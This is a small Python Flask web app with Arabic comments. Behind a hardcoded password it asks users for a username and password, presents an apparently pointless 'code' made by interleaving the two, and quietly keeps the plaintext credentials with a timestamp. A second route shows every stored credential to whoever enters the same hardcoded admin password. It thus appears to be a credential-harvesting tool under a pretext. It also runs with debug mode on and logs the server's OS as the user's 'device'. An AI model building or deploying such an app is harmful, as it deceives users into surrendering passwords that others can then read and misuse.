from flask import Flask, render_template, request, redirect, url_for, jsonify
import datetime
import platform

app = Flask(__name__)

# تخزين بيانات المستخدمين
user_data = []


# صفحة الدخول
@app.route('/')
def login():
    return render_template('login.html')


# التحقق من كلمة المرور
@app.route('/verify', methods=['POST'])
def verify():
    password = request.form['password']
    if password == '96762011':
        return redirect(url_for('user_form'))
    return 'كلمة المرور خاطئة!'


# صفحة إدخال البيانات
@app.route('/user_form')
def user_form():
    return render_template('user_form.html')


# توليد الكود
@app.route('/generate_code', methods=['POST'])
def generate_code():
    username = request.form['username']
    password = request.form['password']
    device_type = platform.system()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # توليد الكود
    code1 = ''.join([username[i] + password[i] for i in range(min(len(username), len(password)))])
    code2 = ''.join([username[i] + password[i] for i in range(1, min(len(username), len(password)))])

    # حفظ المعلومات
    user_data.append((f"{username}, {password}", timestamp, device_type))

    return render_template('code_display.html', code1=code1, code2=code2)


# عرض معلومات المستخدمين
@app.route('/show_credentials', methods=['POST'])
def show_credentials():
    password = request.form['admin_password']
    if password == '96762011':
        return render_template('result.html', result=user_data)
    return 'كلمة المرور خاطئة!'


if __name__ == '__main__':
    app.run(debug=True)
